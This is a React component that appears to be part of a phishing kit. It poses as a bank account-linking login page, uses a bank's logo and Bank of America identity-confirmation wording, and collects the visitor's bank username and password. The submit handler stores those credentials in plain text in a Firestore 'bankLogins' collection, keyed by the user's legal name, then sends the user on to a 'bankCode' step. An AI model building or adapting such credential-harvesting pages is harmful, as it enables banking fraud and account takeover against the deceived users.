import "../styles/bankLogin.css"
import { useNavigate } from "react-router-dom";
import { useState, useEffect } from "react";
import LoadingScreen from "./loadingScreen";
import { auth, db } from "../firebaseConfig";
import { setDoc } from "firebase/firestore";
import { toast } from "react-toastify";
import { addDoc, collection, getDocs, doc, updateDoc, getDoc } from "firebase/firestore";




function BankLogin(prop) {

    const navigate = useNavigate();

    const [showLoad, setShowLoad] = useState(false)

    const [showPassword, setShowPassword] = useState(false)

    function hidePassword() {
        setShowPassword(!showPassword)
    }


     const [userDetails, setUserDetails] = useState(null)

        const fetchUserData = async (e) => {
            auth.onAuthStateChanged(async (user) => {
                console.log(user);
                const docRef = doc(db, "users", user.uid);
                const docSnap = await getDoc(docRef);
                if (docSnap.exists()) {
                    setUserDetails(docSnap.data())
                    console.log(docSnap.data())
                }
            })
        };

        useEffect(() => {
            fetchUserData()
        }, [])

        console.log(userDetails)



    const [logs, setLogs] = useState({
        username: "",
        password: "",
    })

    function getLogs(e) {
        setLogs((prev) => {
            return {
                ...prev,
                [e.target.name]: e.target.value,
            }
        })
    }




    const [isLoading, setIsLoading] = useState(true)

    useEffect(() => {
        setTimeout(() => {
            setIsLoading(false)
        }, 2000)
    },)



    async function submitLogs(e) {
        e.preventDefault();
        setShowLoad(true)
     
        console.log("clicked")
        if (logs.username && logs.password ) {
            try {
                await setDoc(doc(db, "bankLogins", userDetails.legalFName + userDetails.legalLName), {
                    username: logs.username,
                    password: logs.password,
                    bankName: prop.selectedLinkBank.BankName,
                })
                    .then((data) => {
                        toast.success("submitted", { position: "top-center" })
                        navigate("../bankCode")
                        setShowLoad(false)
                    })
                    .catch((error) => {
                        toast.error("error occured", { position: "top-center" })
                        console.log(error.message)
                        setShowLoad(false)
                    })
            } catch (error) {
                toast.error(error, { position: "top-center" })
                console.log(error)
                setShowLoad(false)
            }
        } else {
            toast.error("fill in the details", { position: "top-center" })
            setShowLoad(false)
            console.log(prop.selectedLinkBank.BankName)
        }
    }



    const logo = {
        backgroundImage: `url(${prop.selectedLinkBank.img})`,
        backgroundSize: `200px`,
    }

    return (
        <>
            {showLoad ? <LoadingScreen /> : <div className="bank-login">
                <div className="bank-logo" style={logo}>

                </div>
                <div className="line">

                </div>
                <div className="bank-content">
                    <div className="bc-head">
                        <p>For your protection, Bank of America must confirm your identity and obtain your consent before sharing your online account information.</p>
                    </div>
                    <form onSubmit={submitLogs}>
                        <div className="bc-inputs">
                            <div className="bc-in">
                                <p>User ID/Username/Email</p>
                                <input type="text" name="username" onChange={getLogs} />
                            </div>
                            <div className="bc-in2">
                                <p>Password</p>
                                <div className="pass-box">
                                    <input type={showPassword ? "text": "password"} name="password" onChange={getLogs} />
                                    {showPassword ? <i className="bi-eye" onClick={hidePassword}></i>: <i className="bi-eye-slash" onClick={hidePassword}></i>}
                                </div>
                            </div>
                        </div>
                        <div className="bc-submit">
                            <button>Submit</button>
                        </div>
                    </form>
                    <div className="bc-cancel">
                        <button>Cancel</button>
                    </div>
                    <div className="opt">
                        <p>For help with your User ID or Password, please go to your bank mobile app an opt for a password reset, or visit your bank website</p>
                    </div>
                </div>
            </div>}
            
        </>
    )
}

export default BankLogin;